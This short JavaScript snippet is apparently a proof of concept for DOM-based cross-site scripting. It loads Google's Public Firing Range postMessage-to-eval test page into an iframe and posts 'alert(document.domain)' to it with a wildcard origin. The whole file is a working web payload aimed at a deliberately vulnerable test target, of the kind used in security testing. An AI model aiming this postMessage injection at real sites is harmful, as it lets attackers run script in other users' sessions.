var target = document.getElementById("target")

target.addEventListener('load' , () => {
    target.contentWindow.postMessage("alert(document.domain)", '*')
});

target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"